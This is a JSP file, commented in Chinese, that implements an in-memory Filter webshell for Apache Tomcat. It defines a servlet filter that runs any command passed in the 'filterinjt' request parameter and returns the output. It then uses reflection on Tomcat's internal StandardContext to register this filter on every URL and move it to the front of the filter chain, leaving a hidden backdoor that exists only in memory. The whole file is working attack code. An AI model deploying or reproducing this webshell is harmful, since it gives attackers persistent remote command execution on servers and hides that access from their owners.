<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
基于Tomcat的Filter型内存Webshell
--%>
<%!
    public class FilterDemo implements Filter {

        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
                throws IOException, ServletException {
            try {
                ServletOutputStream out = response.getOutputStream();
                String cmds = request.getParameter("filterinjt");
                if (cmds != null) {
                    InputStream in = Runtime.getRuntime().exec(cmds.split(" ")).getInputStream();
                    StringBuilder sb = new StringBuilder();
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String line = null;
                    while((line = br.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    if (sb.length() > 0) {
                        out.print("<pre>");
                        out.write(sb.toString().getBytes());
                        out.print("</pre>");
                        out.flush();
                        out.close();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            filterChain.doFilter(request, response);
        }

        @Override
        public void destroy() {

        }
    }
%>
<%
    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade appCtxFacade = (ApplicationContextFacade)servletContext;
    Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
    appCtxField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext)appCtxField.get(appCtxFacade);
    Field stdCtxField = ApplicationContext.class.getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext stdCtx = (StandardContext)stdCtxField.get(appCtx);

    //1. 添加filterDef
    FilterDemo filterDemo = new FilterDemo();
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterClass("FilterDemo");
    filterDef.setFilterName(filterDemo.getClass().getName());
    filterDef.setFilter(filterDemo);
    stdCtx.addFilterDef(filterDef);
    //根据filterDefs重新生成filterConfig
    stdCtx.filterStart();
    //2. 添加filterMap
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(filterDemo.getClass().getName());
    filterMap.setDispatcher("REQUEST");
    filterMap.addURLPattern("/*");
    stdCtx.addFilterMap(filterMap);
    //3. 将自定义filter移动到filterMaps数组的第0位置
    //  [这步非必要，只是为了提高filterChain的处理顺序],
    FilterMap[] filterMaps = stdCtx.findFilterMaps();
    FilterMap[] tmpFilterMaps = new FilterMap[filterMaps.length];
    int idx = 1;
    for (int i = 0; i < filterMaps.length; i++) {
        FilterMap tmpFilter = filterMaps[i];
        if (tmpFilter.getFilterName().equalsIgnoreCase(filterDemo.getClass().getName())) {
            tmpFilterMaps[0] = tmpFilter;
        } else {
            tmpFilterMaps[idx++] = tmpFilter;
        }
    }
    for (int i = 0; i < filterMaps.length; i++) {
        filterMaps[i] = tmpFilterMaps[i];
    }
    out.println("injected!");
%>

